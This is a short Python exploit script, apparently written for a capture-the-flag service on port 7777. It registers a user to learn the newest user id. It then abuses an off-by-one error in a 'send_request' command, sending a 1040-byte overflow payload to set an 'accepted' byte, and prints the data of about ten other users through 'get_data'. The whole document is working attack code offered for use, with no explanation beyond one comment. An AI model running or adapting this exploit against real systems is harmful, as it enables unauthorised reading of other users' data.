#!/usr/bin/python3
# send_request has an off-by-one error, allowing us to set the accepted byte to one.

import sys
import socket
import time


ip = sys.argv[1]
PORT = 7777
RECV_TIME = 0.1

# Registering a new user to get last user_id
sock = socket.socket()
sock.connect((ip, PORT))
time.sleep(RECV_TIME)
sock.recv(4096)
sock.send('register\n'.encode('ascii'))
time.sleep(RECV_TIME)
data = sock.recv(4096).decode('ascii')
id = data[data.find('id =')+4:]
id = id[:id.find('\n')].strip()
id = int(id)
token = data[data.find('en =')+4:]
token = token[:token.find('\n')].strip()

evil_payload = 'a'*1040

for i in range(id - 1, max(1, id-11), -1):
  sock.send(('send_request\n%d\n%s\n'%(i, evil_payload)).encode('ascii'))
  time.sleep(RECV_TIME)
  sock.recv(4096)
  sock.send((('get_data\n%d\n')%i).encode('ascii'))
  time.sleep(RECV_TIME)
  print(sock.recv(4096).decode('ascii'))
